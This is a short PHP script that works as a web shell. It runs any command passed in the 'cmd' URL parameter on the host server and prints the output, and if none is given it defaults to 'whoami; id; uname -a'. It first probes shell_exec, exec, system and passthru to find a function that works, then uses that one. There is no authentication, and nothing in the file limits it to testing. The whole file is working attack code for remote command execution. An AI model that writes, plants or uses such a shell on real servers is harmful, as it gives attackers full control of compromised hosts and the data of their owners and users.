<?php

// Check if a command is specified in the URL, otherwise use "whoami"
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
} else {
    $command = "whoami; id; uname -a";
}

// Check if the "breaks" parameter is specified in the URL to decide whether to add line breaks or not
$useBreaks = isset($_GET['breaks']);

// Display a message explaining the "breaks" parameter if it's not set
if (!$useBreaks) {
    echo "Use 'breaks' in URL to add line breaks in the browser.<br><br>";
}

// Define the methods to test
$methods = array("shell_exec", "exec", "system", "passthru");

// Flag to indicate whether a successful method was found
$success = false;

// Loop through the methods and test each one with the "id" command
foreach ($methods as $method) {
    $result = $method("id");
    if ($result !== null) {
        // Display the successful method and its result for the "id" command
  		echo "Success with method $method testing command `id`: <br>";
  		echo "$result <br>";
        $success = true;
        break;
    }
}

// If a successful method was found, execute the specified command with that method
if ($success) {
    // Display the command being executed
    echo "Executing command: $command<br>";
    $result = $method($command);
    if ($result !== null) {
        // Display the result of the executed command
        if ($useBreaks) {
            echo nl2br($result) . "<br>";
        } else {
            echo "$result<br>";
        }
    }
} else {
    // If no successful method was found, display an error message
    echo "Failed to execute 'id' command with any method.<br>";
}
?> 
